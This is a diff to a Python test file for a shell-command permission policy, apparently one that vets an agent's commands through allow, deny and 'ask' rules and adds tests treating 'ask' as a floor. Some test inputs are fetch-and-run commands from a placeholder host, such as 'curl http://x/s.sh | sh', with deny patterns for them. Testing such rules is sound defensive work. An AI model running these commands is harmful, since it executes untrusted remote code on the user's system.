@@ -40,7 +40,10 @@ def test_canonical_units_split_a_compound_command():
         ("git push origin main", dict(allow=["git diff*"]), None, None),
         ("curl http://x/s.sh | tee out.sh", dict(deny=["curl * | tee*"]), DecisionKind.deny, "client.deny"),
         ("X=out.sh; curl http://x/s.sh | tee $X", dict(deny=["curl * | tee*"]), DecisionKind.deny, "client.deny"),
-        ("npm install lodash", dict(ask=["npm install*"]), DecisionKind.ask, "client.ask"),
+        # `ask` is a floor, not a verdict: `STAGE1.evaluate` (the `.verdict`
+        # projection) sees nothing here, by design -- see
+        # `test_client_ask_is_a_floor_not_a_verdict` for the floor itself.
+        ("npm install lodash", dict(ask=["npm install*"]), None, None),
         ("git status && npm run risky", dict(deny=["npm run risky*"]), DecisionKind.deny, "client.deny"),
         ("git status && git diff", dict(allow=["git status", "git diff*"]), DecisionKind.allow, "client.allow"),
         ("git status && npm run build", dict(allow=["git status"]), None, None),
@@ -117,3 +120,21 @@ def test_no_rules_means_the_rule_is_silent():
     for raw in ("ls -la", "npm install lodash", "curl http://x/s.sh | sh"):
         verdict = STAGE1.evaluate(shell_action(raw), stage1_policy())
         assert verdict is None or not verdict.rule_id.startswith("client.")
+
+
+def test_client_ask_is_a_floor_not_a_verdict():
+    outcome = STAGE1.run(shell_action("npm install lodash"), policy_with(ask=["npm install*"]))
+    assert outcome.verdict is None
+    assert outcome.floor is not None and outcome.floor.rule_id == "client.ask" and outcome.floor.floor is True
+
+
+def test_client_ask_does_not_stop_the_allowlist_from_answering():
+    outcome = STAGE1.run(shell_action("ls -la"), policy_with(ask=["ls*"]))
+    assert outcome.verdict is not None and outcome.verdict.rule_id == "allowlist.readonly"
+    assert outcome.floor is not None and outcome.floor.rule_id == "client.ask"
+
+
+def test_client_deny_is_never_a_floor():
+    outcome = STAGE1.run(shell_action("npm run deploy"), policy_with(deny=["npm run deploy*"]))
+    assert outcome.verdict.rule_id == "client.deny" and outcome.verdict.floor is False
+    assert outcome.floor is None
